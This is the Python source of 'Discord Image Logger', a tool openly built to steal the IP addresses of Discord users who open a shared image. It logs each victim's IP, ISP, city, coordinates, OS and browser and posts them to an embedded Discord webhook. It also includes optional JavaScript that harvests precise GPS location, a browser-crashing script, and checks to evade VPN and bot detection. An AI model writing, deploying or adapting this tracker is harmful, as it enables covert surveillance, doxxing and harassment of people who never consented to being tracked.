
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1492286650170999008/fTZqS-EbgiW5dC-2KE1aeyR9fUWAxksyvUmn4CwCfDj5zL6pZc_hyfaCHHIKl3vQcKwA",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
